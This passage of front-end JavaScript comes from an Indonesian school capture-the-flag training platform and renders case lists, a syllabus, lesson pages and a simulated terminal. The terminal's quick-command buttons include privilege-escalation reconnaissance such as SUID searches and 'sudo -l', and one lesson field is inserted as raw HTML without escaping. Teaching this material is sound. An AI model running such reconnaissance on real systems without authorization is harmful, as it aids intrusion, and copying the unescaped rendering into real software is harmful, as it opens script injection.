        <span style="font-family:var(--font-kode);font-size:10px;color:var(--pensil);letter-spacing:1px">STATUS KETUNTASAN</span>
        <strong style="display:block;font-family:var(--font-judul);font-size:32px;color:var(--merah-stempel);margin:4px 0">${solvedCount} / ${totalCount}</strong>
        <span class="meta-tag">TINGKAT KETUNTASAN: ${pct}%</span>
      </div>
      <div class="dossier-card" style="padding:18px">
        <span style="font-family:var(--font-kode);font-size:10px;color:var(--pensil);letter-spacing:1px">LOG PENGIRIMAN FLAG</span>
        <strong style="display:block;font-family:var(--font-judul);font-size:32px;color:var(--tinta-pekat);margin:4px 0">${progress.attempts}</strong>
        <span class="meta-tag">TELEMETRI SERVER AKTIF</span>
      </div>
    </div>

    <!-- Grid Seluruh 60 Kasus -->
    <div style="display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:10px;margin:32px 0 16px">
      <h3 style="font-family:var(--font-judul);font-size:22px;margin:0">Daftar Berkas Kasus Lapangan TJKT (${challenges.length} Kasus di Database)</h3>
      <div style="font-size:12px;color:var(--pensil)">Klik kartu untuk langsung menuju investigasi meja kasus.</div>
    </div>
    <div class="case-index-grid">
      ${challenges.map(x=>{
        const isSolved=progress.solved.includes(x.id);
        const padId=String(x.id).padStart(3,'0');
        return `
          <div class="case-folder-card ${x.id===selected?'active-selected':''}" data-jump="${x.id}">
            <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px">
              <span class="case-folder-serial">#${padId}</span>
              <span class="meta-tag" style="font-size:10px">${escapeHTML(x.category||'Linux')}</span>
            </div>
            <span class="meta-tag" style="background:none;border-color:var(--merah-stempel);color:var(--merah-stempel)">${escapeHTML(x.topic)}</span>
            <div class="case-folder-title">${escapeHTML(x.title)}</div>
            <p class="case-folder-desc" style="margin:6px 0 8px">${escapeHTML(x.summary||(x.lesson?x.lesson.slice(0,85)+'...':''))}</p>
            <div style="background:rgba(0,0,0,0.03);border-left:2.5px solid var(--tinta-pekat);padding:6px 8px;font-size:11px;color:var(--tinta-pekat);margin-bottom:10px;line-height:1.4">
              <strong>Tugas:</strong> ${escapeHTML(x.task)}
            </div>
            <div class="case-folder-footer">
              <span class="meta-tag" style="background:none;border-color:var(--pensil)">${x.difficulty} • ${x.points} XP</span>
              ${isSolved?'<span class="stamp-classified" style="border-color:#2F7F20;color:#2F7F20">SELESAI ✓</span>':'<span class="stamp-classified">BUKA KASUS →</span>'}
            </div>
          </div>
        `;
      }).join('')}
    </div>
  `;

  $('#btnStartCase').onclick=()=>{
    selected=1;
    view='tantangan';
    render();
  };
  $('#btnGoSyllabus').onclick=()=>{
    view='tujuan';
    render();
  };

  document.querySelectorAll('[data-jump]').forEach(card=>{
    card.onclick=()=>{
      stopAudio();
      selected=Number(card.dataset.jump);
      view='tantangan';
      render();
    };
  });
}

/* ================= 2. TUJUAN PEMBELAJARAN & SILABUS TJKT ================= */
async function tujuan(){
  app.innerHTML=`<div class="dossier-card dossier-card-white">Memuat informasi kurikulum TJKT dari database...</div>`;
  try{
    const j=await api('/api/curriculum');
    app.innerHTML=`
      <div class="dossier-card dossier-card-white" style="border:2px solid var(--tinta-pekat)">
        <div style="display:flex;justify-content:space-between;align-items:flex-start;flex-wrap:wrap;gap:12px;margin-bottom:12px">
          <div>
            <div class="dossier-stamp-top">DATABASE TERSINKRONISASI</div>
            <span class="case-file-tab">SILABUS MATA PELAJARAN // ${escapeHTML(j.programKeahlian)}</span>
            <h2 style="font-family:var(--font-judul);font-size:28px;margin:8px 0 6px">Tujuan & Manfaat Pembelajaran Keamanan Siber</h2>
          </div>
          <div>
            ${adminToken ? `
              <button class="btn-primary-action" id="btnEditCurriculumDirect" style="font-size:12px;padding:8px 16px">
                ✏️ Edit Silabus & Tujuan Ini (Mode Guru)
              </button>
            ` : `
              <button class="btn-secondary-action" id="btnLoginAdminForCurriculum" style="font-size:11px;padding:6px 12px">
                🔐 Login Guru untuk Edit Tujuan
              </button>
            `}
          </div>
        </div>

        <p style="font-size:15px;color:var(--tinta-tubuh);max-width:850px;margin-bottom:24px">
          Pemanfaatan platform Capture The Flag (CTF) ini disusun untuk mengimplementasikan pembelajaran berbasis masalah nyata (Problem-Based Learning) pada konsentrasi keahlian Teknik Jaringan Komputer dan Telekomunikasi. Seluruh data tujuan ini terhubung langsung ke database Supabase.
        </p>

        <!-- Manfaat Pembelajaran CTF bagi Siswa TJKT -->
        <h3 style="font-family:var(--font-judul);font-size:20px;border-bottom:1.5px solid var(--tinta-pekat);padding-bottom:8px">
          💡 Manfaat Pembelajaran Melalui Media CTF Interaktif
        </h3>
        <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:16px;margin:16px 0 28px">
          ${(j.manfaatCTF||[]).map(m=>`
            <div style="background:var(--kertas-karton);border:1.5px solid var(--tinta-pekat);padding:16px;border-radius:var(--radius);box-shadow:var(--bayangan-dalam)">
              <div style="font-family:var(--font-kode);font-size:11px;font-weight:700;color:var(--merah-stempel);margin-bottom:6px">KEUNGGULAN PEMBELAJARAN</div>
              <p style="margin:0;font-size:14px;color:var(--tinta-pekat)">${escapeHTML(m)}</p>
            </div>
          `).join('')}
        </div>

        <!-- Capaian & Tujuan Pembelajaran (TP-01 s/d TP-05) -->
        <div style="display:flex;justify-content:space-between;align-items:center;border-bottom:1.5px solid var(--tinta-pekat);padding-bottom:8px">
          <div>
            <h3 style="font-family:var(--font-judul);font-size:20px;margin:0">
              🎯 Capaian & Tujuan Pembelajaran (Elemen Kompetensi TJKT)
            </h3>
            <p style="font-size:12px;color:var(--pensil);margin:4px 0 0">Setiap elemen kompetensi terhubung langsung ke modul 60 kasus di database.</p>
          </div>
          ${adminToken ? `<button class="btn-secondary-action" onclick="adminSubView='curriculum';view='admin';render();" style="font-size:10px">✏️ Kelola TP</button>` : ''}
        </div>
        <div class="curriculum-grid" style="margin-top:16px">
          ${(j.tujuanPembelajaran||[]).map(tp=>{
            const isLinux = tp.bidang.toLowerCase().includes('linux');
            const isNet = tp.bidang.toLowerCase().includes('jaringan');
            const isHw = tp.bidang.toLowerCase().includes('hardware');
            const pilarClass = isLinux?'linux-pillar':isNet?'network-pillar':isHw?'hardware-pillar':'cyber-pillar';
            const catTarget = isLinux?'Linux':isNet?'Jaringan':isHw?'Hardware':'Cyber';
            const caseRange = isLinux?'Kasus #001 s/d #020':isNet?'Kasus #021 s/d #040':isHw?'Kasus #056 s/d #060':'Kasus #041 s/d #055';
            return `
              <div class="curriculum-card ${pilarClass}">
                <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px">
                  <span class="pillar-code">${tp.kode} // ${escapeHTML(tp.bidang)}</span>
                  <span class="meta-tag" style="font-size:9px">${caseRange}</span>
                </div>
                <div class="curriculum-title">${escapeHTML(tp.bidang)}</div>
                <p style="margin:0 0 12px;font-size:13px;color:var(--tinta-tubuh);line-height:1.6">${escapeHTML(tp.deskripsi)}</p>
                <button class="btn-secondary-action btn-go-pillar-mat" data-cat="${catTarget}" style="font-size:10px;padding:4px 10px;width:100%">
                  Lihat Modul ${escapeHTML(tp.bidang)} →
                </button>
              </div>
            `;
          }).join('')}
        </div>

        <!-- Matriks Jenjang Level Materi (Low, Medium, High) -->
        <h3 style="font-family:var(--font-judul);font-size:20px;border-bottom:1.5px solid var(--tinta-pekat);padding-bottom:8px;margin-top:32px">
          📊 Matriks Level Tantangan CTF
        </h3>
        <div style="display:grid;gap:12px;margin-top:16px">
          ${(j.tingkatKesulitan||[]).map(lvl=>`
            <div style="background:var(--kertas);border:1.5px solid var(--tinta-pekat);padding:16px 20px;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:12px">
              <div>
                <span class="meta-tag" style="background:var(--tinta-pekat);color:#fff">${lvl.level}</span>
                <span style="font-family:var(--font-kode);font-weight:700;margin-left:8px">${lvl.xp}</span>
                <div style="font-size:14px;color:var(--tinta-tubuh);margin-top:4px">${escapeHTML(lvl.deskripsi)}</div>
              </div>
              <button class="btn-secondary-action" onclick="view='tantangan';render();" style="font-size:11px">Latihan Kasus →</button>
            </div>
          `).join('')}
        </div>

        <div class="marginalia-note" style="margin-top:24px">
          ✎ Catatan Guru: "Tujuan akhir mata pelajaran ini adalah melahirkan teknisi jaringan yang berintegritas dan siap mengamankan infrastruktur siber nasional."
        </div>
      </div>
    `;

    document.querySelectorAll('.btn-go-pillar-mat').forEach(b=>{
      b.onclick=()=>{
        activeCategoryFilter=b.dataset.cat||'all';
        const matchCase = challenges.find(x=>(x.category||'Linux')===activeCategoryFilter);
        if(matchCase) selected=matchCase.id;
        view='materi';
        render();
        window.scrollTo({top:0,behavior:'smooth'});
      };
    });

    if($('#btnEditCurriculumDirect')){
      $('#btnEditCurriculumDirect').onclick=()=>{
        adminSubView='curriculum';
        view='admin';
        render();
      };
    }

    if($('#btnLoginAdminForCurriculum')){
      $('#btnLoginAdminForCurriculum').onclick=()=>{
        view='superadminLogin';
        render();
      };
    }
  }catch(err){
    app.innerHTML=`<div class="dossier-card">Gagal memuat kurikulum: ${err.message}</div>`;
  }
}

/* ================= 3. BERKAS MATERI ================= */
function materi(){
  const c=challenges.find(x=>x.id===selected)||(challenges.length ? challenges[0] : null);
  if(!c){
    app.innerHTML=`<div class="dossier-card dossier-card-white" style="text-align:center;padding:40px">
      <h3 style="font-family:var(--font-judul);font-size:22px;margin:0 0 10px">Memuat Berkas Materi dari Database...</h3>
      <p style="color:var(--pensil);font-size:14px">Mengambil seluruh arsip modul 60 kasus dari database...</p>
    </div>`;
    fetch('/api/public/challenges').then(r=>r.json()).then(j=>{
      if(j && Array.isArray(j.challenges) && j.challenges.length>0){
        challenges=j.challenges;
        materi();
      }
    }).catch(()=>{});
    return;
  }
  const isSolved=progress.solved.includes(c.id);
  const padId=String(c.id).padStart(3,'0');

  const detailsHtml=(c.details||[]).map(d=>`
    <div class="dossier-card dossier-card-white" style="border-left:4px solid var(--merah-stempel);margin:14px 0;padding:16px 20px">
      <h4 style="font-family:var(--font-judul);font-size:16px;margin:0 0 6px;color:var(--tinta-pekat)">${escapeHTML(d.title)}</h4>
      <p style="margin:0;font-size:14px;color:var(--tinta-tubuh);line-height:1.65">${d.content}</p>
    </div>
  `).join('');

  app.innerHTML=`
    <div class="dossier-card dossier-card-white" style="border:2px solid var(--tinta-pekat)">
      <div style="display:flex;justify-content:space-between;align-items:flex-start;flex-wrap:wrap;gap:12px">
        <div>
          <span class="case-file-tab">PEDOMAN DOKUMEN // #KASUS-${padId} • [${escapeHTML(c.topic)}]</span>
          <h2 style="font-family:var(--font-judul);font-size:28px;margin:8px 0">${escapeHTML(c.title)}</h2>
        </div>
        <div>
          ${isSolved?'<span class="stamp-solved-seal">TERPECAHKAN</span>':'<span class="stamp-classified">KASUS TERBUKA</span>'}
        </div>
      </div>

      <div class="case-briefing-box">
        <strong>RINGKASAN KONSEP:</strong>
        <p style="margin:6px 0 0">${escapeHTML(c.lesson)}</p>
      </div>

      ${renderTapeDeckWidget()}

      <div class="marginalia-note">
        ✎ Catatan Instruktur: "Pahami logika kerja di balik sistem. Eksploitasi hanya berhasil jika kita mengerti asumsi salah yang dibuat oleh pembuat sistem."
      </div>

      <h3 style="font-family:var(--font-judul);font-size:20px;border-bottom:1.5px solid var(--tinta-pekat);padding-bottom:8px;margin-top:28px">
        BEDAH STRUKTUR & ANALISIS TEKNIS LAPANGAN
      </h3>
      ${detailsHtml}

      <div class="case-mission-card">
        <div class="mission-label">🎯 INSTRUKSI PENUGASAN DI MEJA KERJA:</div>
        <p class="mission-task-text">${escapeHTML(c.task)}</p>
        <div style="margin-top:8px;font-family:var(--font-kode);font-size:11px;color:var(--pensil)">
          Gunakan Terminal Simulasi untuk menguji perintah secara langsung, lalu masukkan flag pada Meja Kasus.
        </div>
      </div>

      <div style="display:flex;justify-content:space-between;gap:12px;flex-wrap:wrap;margin-top:28px">
        <button class="btn-secondary-action" id="btnPrevMat" type="button">← Kasus Sebelumnya</button>
        <button class="btn-primary-action" id="btnGoWorkbench" type="button">Buka di Meja Kasus & Pecahkan →</button>
        <button class="btn-secondary-action" id="btnNextMat" type="button">Kasus Selanjutnya →</button>
      </div>
    </div>

    <!-- Filter & Pencarian Materi 60 Kasus -->
    <div style="margin:36px 0 16px;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:12px">
      <div>
        <h3 style="font-family:var(--font-judul);font-size:20px;margin:0 0 4px">Daftar Modul Materi & Kasus CTF (${challenges.length} Kasus di Database)</h3>
        <p style="font-size:12px;color:var(--pensil);margin:0">Arsip materi resmi dan penugasan lapangan sinkron dengan database.</p>
      </div>
      <div>
        <input id="materiSearchInput" placeholder="🔍 Cari judul materi atau tugas..." value="${escapeHTML(materiSearchQuery)}" style="padding:8px 12px;font-size:12px;border:1.5px solid var(--tinta-pekat);border-radius:var(--radius);background:var(--kertas);min-width:280px;font-family:var(--font-kode)">
      </div>
    </div>

    <!-- Filter Pills Kategori -->
    <div style="display:flex;gap:8px;flex-wrap:wrap;margin-bottom:18px">
      ${['all','Linux','Jaringan','Cyber','Hardware'].map(cat=>{
        const count = cat==='all' ? challenges.length : challenges.filter(x=>(x.category||'Linux')===cat).length;
        const labels = {all:'Semua Modul', Linux:'Linux & Server', Jaringan:'Jaringan & Firewall', Cyber:'Cyber & Kripto', Hardware:'Hardware & IoT'};
        const active = activeCategoryFilter === cat;
        return `
          <button class="btn-secondary-action btn-mat-cat-filter" data-cat="${cat}" style="${active?'background:var(--tinta-pekat);color:#fff;border-color:var(--tinta-pekat)':''};font-size:11px;padding:6px 12px">
            ${labels[cat]||cat} (${count})
          </button>
        `;
      }).join('')}
    </div>

    <!-- Daftar Item Materi Format Standar Sinkron dengan Admin -->
    <div id="studentMaterialsListSlot" style="display:grid;gap:12px">
      ${(()=>{
        const q=materiSearchQuery.toLowerCase().trim();
        const filtered=challenges.filter(x=>{
          const matchCat = activeCategoryFilter==='all' || (x.category||'Linux')===activeCategoryFilter;
          const matchQ = !q || (x.title||'').toLowerCase().includes(q) || (x.topic||'').toLowerCase().includes(q) || (x.task||'').toLowerCase().includes(q) || (x.lesson||'').toLowerCase().includes(q) || String(x.id).includes(q);
          return matchCat && matchQ;
        });

        if(filtered.length===0){
          return `<div class="dossier-card dossier-card-white" style="text-align:center;padding:28px;color:var(--pensil);border:1.5px dashed var(--tinta-pekat)">
            Tidak ditemukan materi yang cocok dengan pencarian "${escapeHTML(materiSearchQuery)}".
            <div style="margin-top:10px">
              <button class="btn-secondary-action" onclick="activeCategoryFilter='all';materiSearchQuery='';materi();" style="font-size:11px">Reset Filter & Tampilkan Semua</button>
            </div>
          </div>`;
        }

        return filtered.map(m=>{
          const isSolvedItem=progress.solved.includes(m.id);
          const isCurrentSelected=m.id===selected;
          return `
            <div class="material-item-card ${isCurrentSelected?'active-selected':''}" style="${isCurrentSelected?'border:2px solid var(--merah-stempel);background:#FFFDF7;box-shadow:0 0 0 2px rgba(185,28,28,0.15)':''}">
              <div class="material-item-info" style="flex:1">
                <div style="display:flex;align-items:center;gap:8px;flex-wrap:wrap">
                  <h4 style="margin:0;font-size:16px;color:var(--tinta-pekat)">#${m.id}. ${escapeHTML(m.title)}</h4>
                  ${isSolvedItem?'<span class="meta-tag" style="background:#ECFDF5;color:#059669;border-color:#059669;font-weight:700">✓ TERPECAHKAN</span>':'<span class="meta-tag" style="background:#FEF3C7;color:#92400E">BELUM TUNTAS</span>'}
                  ${isCurrentSelected?'<span class="meta-tag" style="background:var(--merah-stempel);color:#fff;border-color:var(--merah-stempel)">SEDANG DIBUKA</span>':''}
                </div>
                <p style="margin:6px 0 0">
                  <span class="meta-tag">${escapeHTML(m.category||'Linux')}</span>
                  <span class="meta-tag">${escapeHTML(m.difficulty||'Dasar (Low)')}</span>
                  <span class="meta-tag" style="background:#FEF3C7;color:#92400E;font-weight:700">${m.points} XP</span>
                  <span class="meta-tag" style="background:none;border-color:var(--pensil);color:var(--pensil)">${escapeHTML(m.topic||'Umum')}</span>
                </p>
                <p style="margin-top:8px;color:var(--tinta-tubuh);font-size:13px;line-height:1.55">
                  <strong>Tugas:</strong> ${escapeHTML(m.task)}
                </p>
              </div>
              <div style="display:flex;gap:8px;flex-wrap:wrap;align-items:center">
                <button class="btn-secondary-action btn-open-mat-detail" data-id="${m.id}" style="font-size:11px;padding:7px 12px">
                  ${isCurrentSelected?'▲ Sedang Dibaca':'📖 Buka Berkas'}
                </button>
                <button class="btn-primary-action btn-jump-bench" data-id="${m.id}" style="font-size:11px;padding:7px 12px">
                  🚀 Ke Meja Kasus →
                </button>
                ${adminToken ? `<button class="btn-secondary-action btn-quick-admin-edit" data-id="${m.id}" style="font-size:11px;padding:7px 10px;color:var(--merah-stempel)">✏️ Edit (Admin)</button>` : ''}
              </div>
            </div>
          `;
        }).join('');
      })()}
    </div>
  `;

  wireTapeDeck(c.audioText||`${c.title}. ${c.lesson}. Misi: ${c.task}`);

  $('#btnPrevMat').onclick=()=>{
    stopAudio();
    selected=Math.max(1,selected-1);
    materi();
  };
  $('#btnNextMat').onclick=()=>{
    stopAudio();
    selected=Math.min(challenges.length,selected+1);
    materi();
  };
  $('#btnGoWorkbench').onclick=()=>{
    stopAudio();
    view='tantangan';
    render();
  };

  // Search input handler
  const searchInp=$('#materiSearchInput');
  if(searchInp){
    searchInp.oninput=()=>{
      materiSearchQuery=searchInp.value;
      materi();
      const updatedInp=$('#materiSearchInput');
      if(updatedInp){
        updatedInp.focus();
        updatedInp.setSelectionRange(updatedInp.value.length, updatedInp.value.length);
      }
    };
  }

  // Category filter clicks
  document.querySelectorAll('.btn-mat-cat-filter').forEach(btn=>{
    btn.onclick=()=>{
      activeCategoryFilter=btn.dataset.cat;
      materi();
    };
  });

  document.querySelectorAll('.btn-open-mat-detail').forEach(el=>{
    el.onclick=()=>{
      stopAudio();
      selected=Number(el.dataset.id);
      materi();
      window.scrollTo({top:0,behavior:'smooth'});
    };
  });

  document.querySelectorAll('.btn-jump-bench').forEach(el=>{
    el.onclick=()=>{
      stopAudio();
      selected=Number(el.dataset.id);
      view='tantangan';
      render();
      window.scrollTo({top:0,behavior:'smooth'});
    };
  });

  document.querySelectorAll('.btn-quick-admin-edit').forEach(el=>{
    el.onclick=()=>{
      const targetId=Number(el.dataset.id);
      adminSubView='materials';
      view='admin';
      render();
      setTimeout(()=>{
        const btnEdit=document.querySelector(`.btn-edit-mat[data-id="${targetId}"]`);
        if(btnEdit) btnEdit.click();
      },100);
    };
  });
}

/* ================= 4. MEJA KASUS CTF ================= */
function tantangan(){
  const c=challenges.find(x=>x.id===selected)||(challenges.length ? challenges[0] : null);
  if(!c){
    app.innerHTML=`<div class="dossier-card dossier-card-white" style="text-align:center;padding:40px">
      <h3 style="font-family:var(--font-judul);font-size:22px;margin:0 0 10px">Memuat Meja Kasus CTF dari Database...</h3>
      <p style="color:var(--pensil);font-size:14px">Mengambil studi kasus 60 soal dari database...</p>
    </div>`;
    fetch('/api/public/challenges').then(r=>r.json()).then(j=>{
      if(j && Array.isArray(j.challenges) && j.challenges.length>0){
        challenges=j.challenges;
        tantangan();
      }
    }).catch(()=>{});
    return;
  }

  // Jika kategori kasus yang dipilih tidak cocok dengan filter aktif, sinkronkan ke 'all' agar kasus selalu tampak di bilah navigasi
  if(activeCategoryFilter!=='all' && c.category && c.category!==activeCategoryFilter){
    activeCategoryFilter='all';
  }

  const isSolved=progress.solved.includes(c.id);
  const padId=String(c.id).padStart(3,'0');

  app.innerHTML=`
    <!-- Filter Kategori & Pilihan Kasus Cepat -->
    <div style="display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:8px;margin-bottom:10px">
      <div style="font-family:var(--font-kode);font-size:11px;font-weight:700;color:var(--pensil)">
        PILIH KASUS INVESTIGASI (${challenges.length} SOAL TERSEDIA):
      </div>
      <div style="display:flex;gap:6px;flex-wrap:wrap">
        ${['all','Linux','Jaringan','Cyber','Hardware'].map(cat=>{
          const count = cat==='all' ? challenges.length : challenges.filter(x=>(x.category||'Linux')===cat).length;
          const labels = {all:'Semua', Linux:'Linux', Jaringan:'Jaringan', Cyber:'Cyber', Hardware:'Hardware'};
          const active = activeCategoryFilter === cat;
          return `
            <button class="btn-secondary-action btn-bench-cat-filter" data-cat="${cat}" style="${active?'background:var(--tinta-pekat);color:#fff;border-color:var(--tinta-pekat)':''};font-size:10px;padding:3px 8px">
              ${labels[cat]||cat} (${count})
            </button>
          `;
        }).join('')}
      </div>
    </div>

    <!-- Pilihan Kasus Cepat Terfilter -->
    <div style="display:flex;gap:8px;overflow-x:auto;padding-bottom:12px;margin-bottom:18px;-webkit-overflow-scrolling:touch">
      ${challenges.filter(x => activeCategoryFilter==='all' || (x.category||'Linux')===activeCategoryFilter).map(x=>{
        const active=x.id===selected;
        const solved=progress.solved.includes(x.id);
        return `
          <button class="btn-secondary-action" data-pick="${x.id}" style="${active?'background:var(--merah-stempel);color:#fff;border-color:var(--tinta-pekat)':''};white-space:nowrap;font-size:11px">
            #${String(x.id).padStart(3,'0')} ${escapeHTML(x.title)} ${solved?'✓':''}
          </button>
        `;
      }).join('')}
    </div>

    <!-- Peringatan Mode Ujian Jika Aktif -->
    ${c.examMode?`
      <div class="exam-mode-banner" style="margin-bottom:18px">
        <div>
          <strong style="color:#B45309;font-family:var(--font-kode)">⚠️ MODE UJIAN AKTIF (ANTI-KECURANGAN SISWA):</strong>
          <div style="font-size:13px;color:var(--tinta-pekat);margin-top:4px">
            Untuk ujian ini, sistem menghasilkan flag unik untuk akun Anda: <code style="background:var(--tinta-pekat);color:var(--fosfor);padding:2px 6px">${c.dynamicFlag||'FLAG{...}'}</code>. Jawaban siswa lain tidak akan diterima di akun Anda.
          </div>
        </div>
        <span class="stamp-classified" style="border-color:#D97706;color:#D97706">UJIAN BERLANGSUNG</span>
      </div>
    `:''}

    <!-- Tata Letak Dua Kolom: Berkas Dokumen (Kiri) + Meja Kerja (Kanan) -->
    <div class="case-dossier-grid">
      
      <!-- KOLOM KIRI: BERKAS INVESTIGASI KASUS -->
      <div class="case-file-panel">
        <span class="case-file-tab">BERKAS PENYELIDIKAN // #KASUS-${padId}</span>
        
        <div style="display:flex;justify-content:space-between;align-items:flex-start;margin-top:4px">
          <div>
            <span class="meta-tag">${escapeHTML(c.topic)}</span>
            <span class="meta-tag" style="margin-left:6px">${escapeHTML(c.difficulty)} • ${c.points} XP</span>
          </div>
          <div id="stampSlot">
            ${isSolved?'<span class="stamp-solved-seal">TERPECAHKAN</span>':'<span class="stamp-classified">KASUS AKTIF</span>'}
          </div>
        </div>

        <div class="case-title">${escapeHTML(c.title)}</div>

        <div class="case-briefing-box">
          <strong style="font-family:var(--font-kode);font-size:11px;color:var(--pensil);letter-spacing:1px">▸ SITUASI & LATAR BELAKANG:</strong>
          <p style="margin:6px 0 0;font-size:14px">${escapeHTML(c.lesson)}</p>
        </div>

        <div class="case-mission-card">
          <div class="mission-label">🎯 INSTRUKSI PENYELIDIKAN:</div>
          <p class="mission-task-text">${escapeHTML(c.task)}</p>
        </div>

        <div class="marginalia-note" style="font-size:18px">
          ✎ Catatan Pinggir: "${escapeHTML(c.hint)}"
        </div>

        ${renderTapeDeckWidget()}

        <div style="display:flex;gap:10px;margin-top:16px;flex-wrap:wrap">
          <button class="btn-secondary-action" id="btnToggleHint" type="button" style="font-size:11px">
            💡 BUKA PETUNJUK MENTOR
          </button>
          <button class="btn-secondary-action" id="btnGoFullGuide" type="button" style="font-size:11px">
            📖 BACA ANALISIS TEORI LENGKAP
          </button>
        </div>

        <div id="hintRevealBox" style="display:none;background:#FFF9E6;border:1.5px dashed var(--pensil);padding:12px 14px;margin-top:12px;font-size:13px;color:var(--tinta-pekat)"></div>
      </div>

      <!-- KOLOM KANAN: MEJA KERJA (TERMINAL & DISPATCH FLAG) -->
      <div class="case-workbench-panel">
        
        <!-- Bilah Macro Perintah Cepat -->
        <div class="quick-command-bar">
          <span class="quick-command-label">PINTASAN PERINTAH INVESTIGASI (KLIK UNTUK EKSEKUSI):</span>
          <div class="quick-command-pills">
            <button class="cmd-pill" data-cmd="pwd">pwd</button>
            <button class="cmd-pill" data-cmd="ls -la">ls -la</button>
            <button class="cmd-pill" data-cmd="cat config.txt">cat config.txt</button>
            <button class="cmd-pill" data-cmd="find / -perm -u=s -type f 2>/dev/null">find SUID</button>
            <button class="cmd-pill" data-cmd="curl -i http://api.toko.lab/profile">curl profile</button>
            <button class="cmd-pill" data-cmd="cat knock.log">cat knock.log</button>
            <button class="cmd-pill" data-cmd="cat cipher.hex">cat cipher.hex</button>
            <button class="cmd-pill" data-cmd="cat update.sh">cat update.sh</button>
            <button class="cmd-pill" data-cmd="cat uart_config.txt">cat uart_config.txt</button>
            <button class="cmd-pill" data-cmd="sudo -l">sudo -l</button>
            <button class="cmd-pill" data-cmd="cat leak.txt">cat leak.txt</button>
            <button class="cmd-pill" data-cmd="clear">clear</button>
          </div>
        </div>

        <!-- Terminal Layar CRT Vintage -->
        <div class="crt-terminal-frame">
          <div class="crt-terminal-topbar">
            <span>TERMINAL TELEMETRI // TTY1 (LINUX SIMULASI)</span>
            <span>HOST: cyberlab-target.lan • 115200 8N1</span>
          </div>
          <div class="terminal-scroll-area" id="benchTermScroll">
            <div id="benchTermHistory">CyberLab Forensic Shell v2.4 (Simulasi TJKT)\nKetik perintah atau gunakan tombol makro di atas.\n\n</div>
          </div>
          <div class="terminal-input-row">
            <span>pemain@lab:~$ </span>
            <input class="terminal-input-field" id="benchTermInput" spellcheck="false" autofocus aria-label="Terminal prompt">
          </div>
        </div>

        <!-- Formulir Kirim Flag -->
        <div class="flag-submission-card" id="flagSubmitCard">
          <div class="flag-header-row">
            <span style="font-weight:700;letter-spacing:1px">LAPORKAN TEMUAN FLAG:</span>
            <span class="meta-tag">${isSolved?'STATUS: TUNTAS':'STATUS: MENUNGGU JAWABAN'}</span>
          </div>
          <form id="benchFlagSubmitForm">
            <input class="flag-input" id="flagInputField" placeholder="Ketik hasil analisa atau nilai flag" autocomplete="off" required ${isSolved?'disabled':''}>
            <button class="btn-primary-action" type="submit" style="width:100%" ${isSolved?'disabled':''}>
              <span>${isSolved?'✓ Kasus Ini Sudah Terpecahkan':'Kirim Laporan Flag ↵'}</span>
            </button>
          </form>
          <div id="flagFeedbackMsg" class="flag-feedback-msg" style="display:none"></div>
        </div>

        <!-- Kartu Remediasi Paska-Penyelidikan -->
        <div class="dossier-card dossier-card-white" id="remediationCard" style="${isSolved?'display:block':'display:none'};border:2px solid #2F7F20">
          <div style="display:flex;align-items:center;gap:8px;margin-bottom:8px">
            <span class="meta-tag" style="background:#E8F5E5;color:#1A5210;border-color:#2F7F20">ANALISIS FORENSIK PASCA-EKSPLOITASI</span>
          </div>
          <div style="font-size:14px;color:var(--tinta-tubuh);line-height:1.6" id="remediationText">
            ${escapeHTML(c.explain)}
          </div>
        </div>

      </div>
    </div>
  `;

  wireTapeDeck(c.audioText||`${c.title}. ${c.lesson}. Misi: ${c.task}`);
  initTerminal('benchTermScroll','benchTermHistory','benchTermInput');

  document.querySelectorAll('.btn-bench-cat-filter').forEach(btn=>{
    btn.onclick=()=>{
      activeCategoryFilter=btn.dataset.cat;
      tantangan();
    };
  });

  document.querySelectorAll('[data-pick]').forEach(b=>{
    b.onclick=()=>{
      stopAudio();
      selected=Number(b.dataset.pick);
      tantangan();
    };
  });

  $('#btnGoFullGuide').onclick=()=>{
    stopAudio();
    view='materi';
    render();
  };

  $('#btnToggleHint').onclick=()=>{
    const hb=$('#hintRevealBox');
    const isHidden=hb.style.display==='none';
    hb.style.display=isHidden?'block':'none';
    hb.textContent='💡 Petunjuk Mentor: '+c.hint;
  };

  $('#benchFlagSubmitForm').onsubmit=async e=>{
    e.preventDefault();
    const fb=$('#flagFeedbackMsg');
    const card=$('#flagSubmitCard');
    try{
      const j=await api('/api/submit','POST',{id:c.id,answer:$('#flagInputField').value});
      progress=j.progress;
      if(j.correct){
        fb.style.display='block';
        fb.className='flag-feedback-msg success';
        if(j.isFirstBlood){
          fb.innerHTML='🩸 <strong>FIRST BLOOD!</strong> Anda adalah orang pertama yang menyelesaikan kasus ini (+30 XP Bonus Kecepatan)!';
        }else if(j.solverRank>0 && j.solverRank<=5){
          fb.innerHTML=`⚡ <strong>TOP SPEED SOLVER #${j.solverRank}!</strong> Anda mendapatkan +${j.speedBonus} XP Bonus Kecepatan!`;
        }else{
          fb.textContent=j.message||'Kena. Flag valid! Laporan investigasi diterima server.';
        }
        $('#stampSlot').innerHTML='<span class="stamp-solved-seal">TERPECAHKAN</span>';
        $('#remediationCard').style.display='block';
        $('#remediationText').textContent=c.explain;
        setTimeout(()=>{
          tantangan();
        },1800);
      }else{
        card.classList.remove('shake-animation');
        void card.offsetWidth;
        card.classList.add('shake-animation');
        fb.style.display='block';
        fb.className='flag-feedback-msg danger';
        fb.textContent='Belum tepat. Coba teliti kembali petunjuk dan berkas di terminal.';
      }
    }catch(err){
      fb.style.display='block';
      fb.className='flag-feedback-msg danger';
      fb.textContent=err.message;
    }
  };
}

/* ================= 5. KONSOL TERMINAL MANDIRI ================= */
function terminal(){
  app.innerHTML=`
    <div class="dossier-card dossier-card-white" style="border:2px solid var(--tinta-pekat)">
      <div style="display:flex;justify-content:space-between;align-items:flex-start;flex-wrap:gap:12px">
        <div>
          <span class="meta-tag">SUBSISTEM SIMULATOR // ISOLATED SHELL</span>
          <h2 style="font-family:var(--font-judul);font-size:26px;margin:8px 0">Konsol Terminal Lapangan</h2>
          <p style="margin:0;font-size:13px;color:var(--pensil)">
            Konsol interaktif berbasis Linux untuk menguji perintah, membedah berkas log, memeriksa izin biner, dan men-decode string.
          </p>
        </div>
